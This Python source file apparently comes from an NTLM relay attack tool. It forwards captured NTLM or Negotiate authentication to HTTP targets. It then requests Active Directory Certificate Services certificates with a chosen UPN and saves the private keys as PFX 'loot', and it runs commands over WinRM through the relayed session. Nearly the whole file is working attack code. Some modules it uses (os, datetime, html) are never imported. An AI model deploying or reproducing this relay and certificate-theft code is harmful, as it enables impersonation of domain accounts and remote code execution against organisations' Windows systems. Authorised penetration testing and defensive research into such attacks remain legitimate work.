import base64
import http.client
import re
import ssl
import threading
import time
import uuid
from urllib.parse import quote, urlparse

from ._common import NTLM_SESSION_TTL


ADCS_TEMPLATE_FIELDS = (
    "OFFLINE",
    "REALNAME",
    "KEYSPEC",
    "KEYFLAG",
    "ENROLLFLAG",
    "PRIVATEKEYFLAG",
    "SUBJECTFLAG",
    "RASIGNATURE",
    "CSPLIST",
    "EXTOID",
    "EXTMAJ",
    "EXTFMIN",
    "EXTMIN",
    "FRIENDLYNAME",
)
ADCS_UPN_OID = "1.3.6.1.4.1.311.20.2.3"


def _xml_escape(text):
    return (
        str(text)
        .replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace('"', "&quot;")
    )


class HTTPNTLMRelayBackend:
    def __init__(
        self,
        target_url,
        timeout=10,
        action="auth-only",
        adcs_markers=None,
        adcs_template=None,
        adcs_alt_name=None,
        adcs_loot_dir="loot",
        winrm_command=None,
    ):
        self.target_url = target_url
        self.timeout = timeout
        self.action = action
        self.winrm_command = winrm_command
        self.auth_scheme = "Negotiate" if action in ("winrm-id", "winrm-exec") else "NTLM"
        self.relay_method = "POST" if action in ("winrm-id", "winrm-exec") else "GET"
        self.adcs_template = adcs_template
        self.adcs_alt_name = adcs_alt_name
        self.adcs_loot_dir = adcs_loot_dir
        self.adcs_markers = [
            marker.strip()
            for marker in (adcs_markers or [])
            if marker and marker.strip()
        ]
        self.adcs_issued = set()
        self.sessions = {}
        self.lock = threading.RLock()

        parsed = urlparse(target_url)
        if parsed.scheme not in ("http", "https") or not parsed.hostname:
            raise ValueError("relay target must be http:// or https://")

        self.scheme = parsed.scheme
        self.host = parsed.hostname
        default_port = 443 if parsed.scheme == "https" else 80
        self.port = parsed.port or default_port
        host_header = self.host
        if ":" in host_header and not host_header.startswith("["):
            host_header = f"[{host_header}]"
        self.host_header = (
            host_header if self.port == default_port else f"{host_header}:{self.port}"
        )
        self.path = parsed.path or "/"
        if parsed.query:
            self.path += "?" + parsed.query

    def _new_connection(self):
        if self.scheme == "https":
            ctx = ssl.create_default_context()
            return http.client.HTTPSConnection(
                self.host,
                self.port,
                timeout=self.timeout,
                context=ctx,
            )

        return http.client.HTTPConnection(
            self.host,
            self.port,
            timeout=self.timeout,
        )

    def _extract_ntlm_token(self, response):
        headers = response.getheaders()

        for name, value in headers:
            if name.lower() != "www-authenticate":
                continue

            parts = [part.strip() for part in value.split(",")]
            for part in parts:
                low = part.lower()
                if low.startswith("ntlm ") or low.startswith("negotiate "):
                    return part.split(" ", 1)[1]

        return None

    def _headers_dict(self, response):
        headers = {}
        for name, value in response.getheaders():
            key = name.lower()
            if key in headers:
                headers[key] = f"{headers[key]}, {value}"
            else:
                headers[key] = value
        return headers

    def _read_response_body(self, response, max_hint=4096):
        content_length = response.getheader("Content-Length")
        transfer_encoding = response.getheader("Transfer-Encoding", "")

        if content_length is not None or "chunked" in transfer_encoding.lower():
            body = response.read()
            return body[:max_hint], len(body), True

        body = response.read(max_hint)
        return body, len(body), False

    def _result_from_response(self, response, body, body_len, prefix=""):
        headers = self._headers_dict(response)
        key = f"{prefix}_" if prefix else ""

        return {
            f"{key}status": response.status,
            f"{key}reason": response.reason,
            f"{key}body_len": body_len,
            f"{key}server": headers.get("server", ""),
            f"{key}content_type": headers.get("content-type", ""),
            f"{key}location": headers.get("location", ""),
            f"{key}set_cookie": headers.get("set-cookie", ""),
            f"{key}www_authenticate": headers.get("www-authenticate", ""),
            f"{key}body_hint": body[:200].decode("latin-1", errors="replace"),
        }

    def _write_debug_body(self, label, body):
        if not self.adcs_loot_dir:
            return ""

        try:
            os.makedirs(self.adcs_loot_dir, exist_ok=True)
            stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
            path = os.path.join(self.adcs_loot_dir, f"{stamp}-{label}.html")
            with open(path, "wb") as fh:
                fh.write(body)
            return path
        except OSError:
            return ""

    def _adcs_base_path(self):
        path = self.path.split("?", 1)[0]
        certsrv_index = path.lower().find("/certsrv")
        if certsrv_index == -1:
            return ""

        return path[: certsrv_index + len("/certsrv")].rstrip("/")

    def _adcs_path(self, leaf):
        base = self._adcs_base_path()
        if not base:
            return self.path
        return f"{base}/{leaf.lstrip('/')}"

    def _adcs_probe_path(self):
        return self._adcs_path("certrqxt.asp")

    def _parse_adcs_template_options(self, body_text):
        templates = []
        option_values = re.findall(
            r"<option\s+value=\"(.*?)\"",
            body_text,
            flags=re.IGNORECASE,
        )

        for raw_value in option_values:
            parts = html.unescape(raw_value).split(";")
            template = {}
            for index, value in enumerate(parts):
                key = (
                    ADCS_TEMPLATE_FIELDS[index]
                    if index < len(ADCS_TEMPLATE_FIELDS)
                    else f"UNKNOWN_{index}"
                )
                template[key] = value
            templates.append(template)

        return templates

    def _authenticated_followup(self, conn, path=None, connection="close"):
        followup_path = path or self.path
        conn.request(
            "GET",
            followup_path,
            headers={
                "Host": self.host_header,
                "Connection": connection,
                "User-Agent": "pywsus-ntlm-relay",
            },
        )
        res = conn.getresponse()
        body, body_len, body_drained = self._read_response_body(res)
        result = self._result_from_response(res, body, body_len, "followup")
        result["followup_path"] = followup_path
        result["followup_body_drained"] = body_drained
        result["followup_will_close"] = getattr(res, "will_close", False)
        result["followup_authenticated"] = self._looks_authenticated(
            {
                "status": result["followup_status"],
                "www_authenticate": result["followup_www_authenticate"],
            }
        )
        return result, body

    def _load_adcs_crypto(self):
        try:
            from cryptography import x509  # type: ignore
            from cryptography.hazmat.primitives import hashes  # type: ignore
            from cryptography.hazmat.primitives.asymmetric import rsa  # type: ignore
            from cryptography.hazmat.primitives.serialization import (  # type: ignore
                Encoding,
                NoEncryption,
                pkcs12,
            )
            from cryptography.x509 import (  # type: ignore
                load_der_x509_certificate,
                load_pem_x509_certificate,
            )
            from cryptography.x509.oid import (  # type: ignore
                NameOID,
                ObjectIdentifier,
            )
        except ImportError as err:
            raise RuntimeError("AD CS issuance requires cryptography") from err

        return {
            "Encoding": Encoding,
            "NameOID": NameOID,
            "NoEncryption": NoEncryption,
            "ObjectIdentifier": ObjectIdentifier,
            "hashes": hashes,
            "load_der_x509_certificate": load_der_x509_certificate,
            "load_pem_x509_certificate": load_pem_x509_certificate,
            "pkcs12": pkcs12,
            "rsa": rsa,
            "x509": x509,
        }

    @staticmethod
    def _der_length(length):
        if length < 0x80:
            return bytes([length])

        length_bytes = length.to_bytes((length.bit_length() + 7) // 8, "big")
        return bytes([0x80 | len(length_bytes)]) + length_bytes

    @classmethod
    def _der_utf8_string(cls, value):
        raw = value.encode("utf-8")
        return b"\x0c" + cls._der_length(len(raw)) + raw

    def _adcs_generate_key_and_csr(self, crypto, common_name, alt_name):
        key = crypto["rsa"].generate_private_key(
            public_exponent=65537,
            key_size=4096,
        )

        builder = crypto["x509"].CertificateSigningRequestBuilder()
        if common_name:
            builder = builder.subject_name(
                crypto["x509"].Name([
                    crypto["x509"].NameAttribute(
                        crypto["NameOID"].COMMON_NAME,
                        common_name,
                    )
                ])
            )

        if alt_name:
            builder = builder.add_extension(
                crypto["x509"].SubjectAlternativeName([
                    crypto["x509"].OtherName(
                        crypto["ObjectIdentifier"](ADCS_UPN_OID),
                        self._der_utf8_string(alt_name),
                    )
                ]),
                critical=False,
            )

        csr = builder.sign(key, crypto["hashes"].SHA256())
        return key, csr.public_bytes(crypto["Encoding"].PEM)

    @staticmethod
    def _adcs_generate_pfx(crypto, key, certificate):
        return crypto["pkcs12"].serialize_key_and_certificates(
            name=b"",
            key=key,
            cert=certificate,
            cas=None,
            encryption_algorithm=crypto["NoEncryption"](),
        )

    @staticmethod
    def _adcs_load_certificate(crypto, raw_certificate):
        try:
            return crypto["load_pem_x509_certificate"](raw_certificate)
        except Exception:
            return crypto["load_der_x509_certificate"](raw_certificate)

    @staticmethod
    def _adcs_cert_attributes(template, alt_name):
        if alt_name:
            return f"CertificateTemplate:{template}%0d%0aSAN:upn={alt_name}"
        return f"CertificateTemplate:{template}"

    @staticmethod
    def _sanitize_filename(name):
        sanitized = re.sub(r"[^A-Za-z0-9._-]", "_", name or "")
        sanitized = sanitized.strip("._")
        return sanitized or "certificate"

    def _adcs_identity_key(self, identity, username):
        return (identity or username or "").lower()

    def _adcs_template_for(self, username):
        if self.adcs_template:
            return self.adcs_template
        return "Machine" if (username or "").endswith("$") else "User"

    def _extract_adcs_request_id(self, body):
        body_text = body.decode("latin-1", errors="replace")
        found = re.findall(r'location="certnew\.cer\?ReqID=(.*?)&', body_text)
        if found:
            return html.unescape(found[0])

        found = re.findall(r"certnew\.cer\?ReqID=([^&\"'>\s]+)", body_text)
        if found:
            return html.unescape(found[0])

        return ""

    def _issue_adcs_certificate(self, conn, identity, username):
        issue_key = self._adcs_identity_key(identity, username)
        with self.lock:
            if issue_key and issue_key in self.adcs_issued:
                return {
                    "adcs_issue_attempted": False,
                    "adcs_issued": False,
                    "adcs_issue_state": "skipped-duplicate",
                }

        template = self._adcs_template_for(username)
        quoted_template = quote(template)
        result = {
            "adcs_issue_attempted": True,
            "adcs_issued": False,
            "adcs_issue_state": "started",
            "adcs_template": template,
            "adcs_alt_name": self.adcs_alt_name or "",
            "adcs_loot_dir": self.adcs_loot_dir,
        }

        crypto = self._load_adcs_crypto()
        common_name = username or identity
        key, csr = self._adcs_generate_key_and_csr(
            crypto,
            common_name,
            self.adcs_alt_name,
        )
        encoded_csr = (
            csr.decode()
            .replace("\n", "")
            .replace("+", "%2b")
            .replace(" ", "+")
        )
        cert_attrib = self._adcs_cert_attributes(
            quoted_template,
            self.adcs_alt_name,
        )
        data = (
            "Mode=newreq&CertRequest=%s&CertAttrib=%s&"
            "TargetStoreFlags=0&SaveCert=yes&ThumbPrint="
        ) % (encoded_csr, cert_attrib)
        data_bytes = data.encode("utf-8")

        submit_path = self._adcs_path("certfnsh.asp")
        conn.request(
            "POST",
            submit_path,
            body=data_bytes,
            headers={
                "Host": self.host_header,
                "Connection": "keep-alive",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(len(data_bytes)),
            },
        )
        submit_res = conn.getresponse()
        submit_body, submit_body_len, submit_drained = self._read_response_body(
            submit_res,
            max_hint=65536,
        )
        result.update(
            self._result_from_response(
                submit_res,
                submit_body,
                submit_body_len,
                "adcs_submit",
            )
        )

        if submit_res.status != 200:
            result["adcs_issue_state"] = "submit-failed"
            result["adcs_issue_error"] = f"submit HTTP {submit_res.status}"
            debug_path = self._write_debug_body("adcs-submit-failed", submit_body)
            if debug_path:
                result["adcs_debug_path"] = debug_path
            return result

        request_id = self._extract_adcs_request_id(submit_body)
        if not request_id:
            result["adcs_issue_state"] = "request-id-missing"
            result["adcs_issue_error"] = "certificate request ID not found"
            debug_path = self._write_debug_body("adcs-submit-no-reqid", submit_body)
            if debug_path:
                result["adcs_debug_path"] = debug_path
            return result

        result["adcs_certificate_id"] = request_id

        if not submit_drained or getattr(submit_res, "will_close", False):
            result["adcs_issue_state"] = "certificate-fetch-skipped"
            result["adcs_issue_error"] = "target closed before certificate fetch"
            return result

        cert_path = self._adcs_path(f"certnew.cer?ReqID={request_id}")
        conn.request(
            "GET",
            cert_path,
            headers={
                "Host": self.host_header,
                "Connection": "close",
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            },
        )
        cert_res = conn.getresponse()
        cert_body, cert_body_len, _ = self._read_response_body(
            cert_res,
            max_hint=262144,
        )
        result.update(
            self._result_from_response(
                cert_res,
                cert_body,
                cert_body_len,
                "adcs_cert",
            )
        )

        if cert_res.status != 200:
            result["adcs_issue_state"] = "certificate-fetch-failed"
            result["adcs_issue_error"] = f"certificate HTTP {cert_res.status}"
            debug_path = self._write_debug_body("adcs-cert-fetch-failed", cert_body)
            if debug_path:
                result["adcs_debug_path"] = debug_path
            return result

        try:
            cert_obj = self._adcs_load_certificate(crypto, cert_body)
        except Exception as err:
            result["adcs_issue_state"] = "certificate-parse-failed"
            result["adcs_issue_error"] = str(err)
            debug_path = self._write_debug_body("adcs-cert-parse-failed", cert_body)
            if debug_path:
                result["adcs_debug_path"] = debug_path
            return result

        pfx_data = self._adcs_generate_pfx(crypto, key, cert_obj)
        os.makedirs(self.adcs_loot_dir, exist_ok=True)
        pfx_name = self._sanitize_filename(identity or username)
        pfx_path = os.path.join(self.adcs_loot_dir, f"{pfx_name}.pfx")
        with open(pfx_path, "wb") as fh:
            fh.write(pfx_data)

        with self.lock:
            if issue_key:
                self.adcs_issued.add(issue_key)

        result.update({
            "adcs_issued": True,
            "adcs_issue_state": "issued",
            "adcs_pfx_path": pfx_path,
            "adcs_pfx_size": len(pfx_data),
        })
        return result

    def start_type1(self, session_key, type1_token):
        conn = self._new_connection()

        try:
            with self.lock:
                old_session = self.sessions.pop(session_key, None)
            if old_session:
                old_session["conn"].close()

            # POST body for the WinRM handshake so /wsman accepts the method; GET otherwise.
            neg_body = b"" if self.relay_method == "POST" else None
            base_headers = {
                "Host": self.host_header,
                "Connection": "keep-alive",
                "User-Agent": "pywsus-ntlm-relay",
            }
            if self.relay_method == "POST":
                base_headers["Content-Type"] = "application/soap+xml;charset=UTF-8"

            # Some HTTP NTLM targets expect a first unauthenticated request.
            conn.request(self.relay_method, self.path, body=neg_body, headers=dict(base_headers))
            res = conn.getresponse()
            res.read()

            conn.request(
                self.relay_method,
                self.path,
                body=neg_body,
                headers={**base_headers, "Authorization": f"{self.auth_scheme} {type1_token}"},
            )
            res = conn.getresponse()
            body = res.read()

            type2 = self._extract_ntlm_token(res)
            if not type2:
                raise RuntimeError(
                    f"target did not return NTLM Type 2. "
                    f"status={res.status} reason={res.reason} body_len={len(body)}"
                )
            if getattr(res, "will_close", False):
                raise RuntimeError(
                    f"target returned NTLM Type 2 but closed the connection. "
                    f"status={res.status} reason={res.reason}"
                )

            with self.lock:
                self.sessions[session_key] = {
                    "conn": conn,
                    "target_status_type2": res.status,
                    "created_at": time.time(),
                }

            return type2
        except Exception:
            conn.close()
            raise

    def finish_type3(self, session_key, type3_token, identity="", username=""):
        with self.lock:
            session = self.sessions.pop(session_key, None)
        if not session:
            raise RuntimeError("missing relay session for Type 3")

        conn = session["conn"]

        try:
            t3_headers = {
                "Host": self.host_header,
                "Connection": "keep-alive",
                "User-Agent": "pywsus-ntlm-relay",
                "Authorization": f"{self.auth_scheme} {type3_token}",
            }
            if self.relay_method == "POST":
                t3_headers["Content-Type"] = "application/soap+xml;charset=UTF-8"
            conn.request(
                self.relay_method,
                self.path,
                body=(b"" if self.relay_method == "POST" else None),
                headers=t3_headers,
            )
            res = conn.getresponse()
            body, body_len, body_drained = self._read_response_body(res)
            result = self._result_from_response(res, body, body_len)
            result.update({
                "authenticated": False,
                "type3_accepted": False,
                "followup_attempted": False,
                "followup_authenticated": None,
                "followup_state": "not-run",
                "auth_validation": "rejected",
                "action": self.action,
                "target_status_type2": session.get("target_status_type2"),
            })
            service_body = body

            result["type3_accepted"] = self._looks_authenticated(result)

            # WinRM: the Type 3 POST already authenticated the connection; skip the GET
            # follow-up (which would 405 on /wsman) and let _winrm_run drive it.
            winrm_action = self.action in ("winrm-id", "winrm-exec")

            if result["type3_accepted"] and not winrm_action:
                if body_drained and not getattr(res, "will_close", False):
                    result["followup_attempted"] = True
                    followup_path = (
                        self._adcs_probe_path()
                        if self.action in ("adcs-certsrv", "adcs-issue")
                        else self.path
                    )
                    followup_connection = (
                        "keep-alive" if self.action == "adcs-issue" else "close"
                    )
                    try:
                        followup, followup_body = self._authenticated_followup(
                            conn,
                            followup_path,
                            connection=followup_connection,
                        )
                        result.update(followup)
                        if result.get("followup_authenticated") is True:
                            service_body = followup_body
                    except Exception as err:
                        result["followup_error"] = str(err)
                        result["followup_state"] = "error"

                if result.get("followup_authenticated") is True:
                    result["authenticated"] = True
                    result["followup_state"] = "accepted"
                    result["auth_validation"] = "type3-and-followup"
                elif result.get("followup_authenticated") is False:
                    result["authenticated"] = False
                    result["followup_state"] = "rejected"
                    result["auth_validation"] = "followup-rejected"
                else:
                    result["authenticated"] = True
                    result["auth_validation"] = "type3-only"
            elif result["type3_accepted"] and winrm_action:
                result["authenticated"] = True
                result["auth_validation"] = "type3-only"

            if self.action in ("adcs-certsrv", "adcs-issue"):
                result.update(self._evaluate_adcs_certsrv(service_body, result))
                if self.action == "adcs-issue":
                    can_issue = (
                        result["authenticated"]
                        and result["service_validated"]
                        and result.get("followup_body_drained") is True
                        and not result.get("followup_will_close", True)
                    )
                    if can_issue:
                        try:
                            issue_result = self._issue_adcs_certificate(
                                conn,
                                identity,
                                username,
                            )
                            result.update(issue_result)
                        except Exception as err:
                            result.update({
                                "adcs_issue_attempted": True,
                                "adcs_issued": False,
                                "adcs_issue_state": "error",
                                "adcs_issue_error": str(err),
                            })
                    else:
                        issue_state = "skipped-validation-failed"
                        if result["authenticated"] and result["service_validated"]:
                            issue_state = "skipped-connection-not-reusable"
                        result.update({
                            "adcs_issue_attempted": False,
                            "adcs_issued": False,
                            "adcs_issue_state": issue_state,
                        })
            elif self.action in ("winrm-id", "winrm-exec"):
                result.update({"service": "winrm"})
                if result["authenticated"]:
                    try:
                        result.update(self._winrm_run(conn, identity))
                    except Exception as err:
                        result.update({
                            "winrm_state": "error",
                            "winrm_error": str(err),
                            "service_validated": False,
                        })
                else:
                    result.update({
                        "winrm_state": "auth-failed",
                        "service_validated": False,
                        "winrm_http_status": result.get("status"),
                        "winrm_www_auth": result.get("www_authenticate", ""),
                    })
            else:
                result.update({
                    "service": "generic-http",
                    "service_validated": result["authenticated"],
                    "evidence": [],
                })

            return result
        finally:
            conn.close()

    # -- WinRM (WS-Management over HTTP) -----------------------------------

    def _winrm_post(self, conn, envelope):
        """POST one SOAP envelope on the already-authenticated keep-alive connection."""
        body = envelope.encode("utf-8")
        conn.request(
            "POST",
            self.path,
            body=body,
            headers={
                "Host": self.host_header,
                "Connection": "keep-alive",
                "User-Agent": "pywsus-ntlm-relay",
                "Content-Type": 'application/soap+xml;charset=UTF-8',
                "Content-Length": str(len(body)),
            },
        )
        res = conn.getresponse()
        data, _, _ = self._read_response_body(res, max_hint=1 << 20)
        text = data.decode("utf-8", errors="replace")
        return res.status, text

    @staticmethod
    def _winrm_requires_encryption(status, text):
        low = text.lower()
        return (
            status == 415
            or "unencrypted" in low
            or "encrypt" in low and "wsman" in low
        )

    def _winrm_envelope(self, action, resource, body_xml, selectors=None, options=""):
        to = f"http://{self.host_header}{self.path}"
        msgid = str(uuid.uuid4()).upper()
        sel = ""
        if selectors:
            items = "".join(
                f'<w:Selector Name="{k}">{v}</w:Selector>' for k, v in selectors.items()
            )
            sel = f"<w:SelectorSet>{items}</w:SelectorSet>"
        return (
            '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
            ' xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing"'
            ' xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"'
            ' xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell">'
            "<s:Header>"
            f'<a:To>{to}</a:To>'
            f'<w:ResourceURI s:mustUnderstand="true">{resource}</w:ResourceURI>'
            '<a:ReplyTo><a:Address s:mustUnderstand="true">'
            "http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous"
            "</a:Address></a:ReplyTo>"
            f'<a:Action s:mustUnderstand="true">{action}</a:Action>'
            '<w:MaxEnvelopeSize s:mustUnderstand="true">153600</w:MaxEnvelopeSize>'
            f"<a:MessageID>uuid:{msgid}</a:MessageID>"
            '<w:Locale xml:lang="en-US" s:mustUnderstand="false"/>'
            '<w:OperationTimeout>PT60.000S</w:OperationTimeout>'
            f"{sel}{options}"
            "</s:Header>"
            f"<s:Body>{body_xml}</s:Body>"
            "</s:Envelope>"
        )

    _WINRM_SHELL_URI = "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd"

    def _winrm_run(self, conn, identity):
        identify = (
            '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"'
            ' xmlns:wsmid="http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd">'
            "<s:Header/><s:Body><wsmid:Identify/></s:Body></s:Envelope>"
        )
        status, text = self._winrm_post(conn, identify)
        result = {
            "winrm_identify_status": status,
            "service_validated": False,
            "winrm_product": "",
        }
        m = re.search(r"ProductVersion>([^<]+)<", text)
        if m:
            result["winrm_product"] = m.group(1).strip()

        if self._winrm_requires_encryption(status, text):
            result.update({
                "winrm_state": "encryption-required",
                "service_validated": True,   # auth relayed; the endpoint just demands encryption
            })
            return result

        result["service_validated"] = status == 200 or bool(result["winrm_product"])

        if self.action == "winrm-id":
            result["winrm_state"] = "identified" if result["service_validated"] else "no-identify"
            return result

        command = self.winrm_command or "whoami"
        create = self._winrm_envelope(
            "http://schemas.xmlsoap.org/ws/2004/09/transfer/Create",
            self._WINRM_SHELL_URI,
            "<rsp:Shell><rsp:InputStreams>stdin</rsp:InputStreams>"
            "<rsp:OutputStreams>stdout stderr</rsp:OutputStreams></rsp:Shell>",
            options='<w:OptionSet><w:Option Name="WINRS_NOPROFILE">FALSE</w:Option>'
                    '<w:Option Name="WINRS_CODEPAGE">437</w:Option></w:OptionSet>',
        )
        status, text = self._winrm_post(conn, create)
        if self._winrm_requires_encryption(status, text):
            result.update({"winrm_state": "encryption-required", "service_validated": True})
            return result
        shell_id = None
        m = re.search(r"ShellId>([^<]+)<", text) or re.search(
            r'Selector Name="ShellId">([^<]+)<', text
        )
        if m:
            shell_id = m.group(1).strip()
        if not shell_id:
            result.update({
                "winrm_state": "shell-create-failed",
                "winrm_exec_status": status,
                "winrm_fault": self._winrm_fault(text),
            })
            return result
        result["winrm_shell_id"] = shell_id

        try:
            cmd_env = self._winrm_envelope(
                "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command",
                self._WINRM_SHELL_URI,
                f"<rsp:CommandLine><rsp:Command>{_xml_escape(command)}</rsp:Command>"
                "</rsp:CommandLine>",
                selectors={"ShellId": shell_id},
            )
            status, text = self._winrm_post(conn, cmd_env)
            m = re.search(r"CommandId>([^<]+)<", text)
            if not m:
                result.update({
                    "winrm_state": "command-failed",
                    "winrm_exec_status": status,
                    "winrm_fault": self._winrm_fault(text),
                })
                return result
            command_id = m.group(1).strip()

            out, exit_code = self._winrm_receive(conn, shell_id, command_id)
            result.update({
                "winrm_state": "executed",
                "winrm_command": command,
                "winrm_exit_code": exit_code,
                "winrm_output": out,
                "service_validated": True,
            })
        finally:
            try:
                self._winrm_post(conn, self._winrm_envelope(
                    "http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete",
                    self._WINRM_SHELL_URI, "", selectors={"ShellId": shell_id},
                ))
            except Exception:
                pass
        return result

    def _winrm_receive(self, conn, shell_id, command_id, max_rounds=20):
        chunks = []
        exit_code = None
        for _ in range(max_rounds):
            recv = self._winrm_envelope(
                "http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive",
                self._WINRM_SHELL_URI,
                f'<rsp:Receive><rsp:DesiredStream CommandId="{command_id}">'
                "stdout stderr</rsp:DesiredStream></rsp:Receive>",
                selectors={"ShellId": shell_id},
            )
            status, text = self._winrm_post(conn, recv)
            for m in re.finditer(r'<rsp:Stream[^>]*Name="std(?:out|err)"[^>]*>([^<]*)</rsp:Stream>', text):
                blob = m.group(1).strip()
                if blob:
                    try:
                        chunks.append(base64.b64decode(blob).decode("utf-8", errors="replace"))
                    except Exception:
                        pass
            done = re.search(r'CommandState[^>]*State="[^"]*/Done"', text)
            ec = re.search(r"ExitCode>(\d+)<", text)
            if ec:
                exit_code = int(ec.group(1))
            if done:
                break
        return "".join(chunks), exit_code

    @staticmethod
    def _winrm_fault(text):
        m = re.search(r"<[^>]*Reason[^>]*>.*?<[^>]*Text[^>]*>([^<]+)<", text, re.S)
        if m:
            return m.group(1).strip()[:200]
        m = re.search(r"<[^>]*Subcode[^>]*>.*?<[^>]*Value[^>]*>([^<]+)<", text, re.S)
        return (m.group(1).strip() if m else "")[:200]

    def _looks_authenticated(self, result):
        return (
            result["status"] not in (401, 403)
            and "ntlm" not in result.get("www_authenticate", "").lower()
        )

    def _evaluate_adcs_certsrv(self, body, result):
        body_text = body.decode("latin-1", errors="replace")
        body_lower = body_text.lower()
        evidence = []
        score = 0
        marker_found = False
        custom_marker_found = False

        if self.path.rstrip("/").lower().endswith("/certsrv"):
            evidence.append("target_path=/certsrv/")
            score += 1

        followup_path = result.get("followup_path", "")
        if followup_path.split("?", 1)[0].rstrip("/").lower().endswith(
            "/certsrv/certrqxt.asp"
        ):
            evidence.append("probe_path=/certsrv/certrqxt.asp")
            score += 2

        templates = self._parse_adcs_template_options(body_text)
        if templates:
            evidence.append(f"body:template_options={len(templates)}")
            score += 4
            marker_found = True

        strong_markers = {
            "microsoft active directory certificate services": (
                "body:microsoft active directory certificate services",
                4,
            ),
            "active directory certificate services": (
                "body:active directory certificate services",
                4,
            ),
            "certificate services": ("body:certificate services", 3),
            "certfnsh.asp": ("body:certfnsh.asp", 3),
            "certrqma.asp": ("body:certrqma.asp", 3),
            "certrqxt.asp": ("body:certrqxt.asp", 3),
            "certcarc.asp": ("body:certcarc.asp", 3),
            "certckpn.asp": ("body:certckpn.asp", 3),
            "certnew.cer": ("body:certnew.cer", 3),
            "certnew.p7b": ("body:certnew.p7b", 3),
        }
        weak_markers = {
            "certsrv": ("body:certsrv", 1),
            "/certsrv/": ("body:/certsrv/", 1),
            "certificate authority": ("body:certificate authority", 2),
            "request a certificate": ("body:request a certificate", 2),
            "download a ca certificate": ("body:download a ca certificate", 2),
        }

        for marker in self.adcs_markers:
            if marker.lower() in body_lower:
                evidence.append(f"custom_marker:{marker}")
                score += 4
                marker_found = True
                custom_marker_found = True

        for marker, (label, weight) in strong_markers.items():
            if marker in body_lower:
                evidence.append(label)
                score += weight
                marker_found = True

        for marker, (label, weight) in weak_markers.items():
            if marker in body_lower:
                evidence.append(label)
                score += weight

        content_type_key = (
            "followup_content_type"
            if result.get("followup_authenticated") is True
            else "content_type"
        )
        content_type = result.get(content_type_key, "").lower()
        if "html" in content_type:
            evidence.append(f"{content_type_key}={result[content_type_key]}")
            score += 1

        server_key = (
            "followup_server"
            if result.get("followup_authenticated") is True
            else "server"
        )
        server = result.get(server_key, "").lower()
        if "iis" in server or "microsoft" in server:
            evidence.append(f"{server_key}={result[server_key]}")
            score += 1

        return {
            "service": "adcs-web-enrollment",
            "service_validated": result["authenticated"] and marker_found,
            "adcs_score": score,
            "adcs_marker_found": marker_found,
            "adcs_custom_marker_found": custom_marker_found,
            "adcs_template_count": len(templates),
            "adcs_templates": templates,
            "evidence": evidence,
        }

    def drop_session(self, session_key):
        with self.lock:
            session = self.sessions.pop(session_key, None)
        if session:
            session["conn"].close()

    def cleanup_sessions(self, max_age=NTLM_SESSION_TTL):
        now = time.time()
        with self.lock:
            stale = [
                key for key, session in self.sessions.items()
                if now - session.get("created_at", now) > max_age
            ]
            sessions = [self.sessions.pop(key) for key in stale]

        for session in sessions:
            session["conn"].close()

        return len(sessions)

